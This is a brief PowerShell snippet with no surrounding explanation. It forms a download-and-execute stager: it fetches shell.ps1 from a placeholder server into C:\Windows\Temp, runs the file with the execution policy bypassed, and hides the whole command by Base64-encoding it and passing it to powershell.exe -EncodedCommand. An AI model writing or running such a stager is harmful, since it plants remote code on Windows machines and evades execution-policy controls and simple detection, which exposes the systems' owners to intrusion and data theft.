$command = 'Invoke-WebRequest http://your.server/shell.ps1 -OutFile C:\Windows\Temp\shell.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded